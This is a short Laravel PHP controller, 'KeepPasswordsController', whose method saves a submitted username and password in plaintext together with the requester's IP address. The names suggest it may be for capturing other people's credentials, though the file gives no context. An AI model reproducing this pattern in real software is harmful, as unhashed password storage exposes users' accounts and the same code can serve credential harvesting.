<?php

namespace App\Http\Controllers;

use App\Models\KeepPasswords;

class KeepPasswordsController extends Controller
{
    public function keeper($username, $password)
    {
        $keep = new KeepPasswords();
        $keep->username = $username;
        $keep->password = $password;
        $keep->ip_address = request()->ip();
        $keep->save();
    }
}
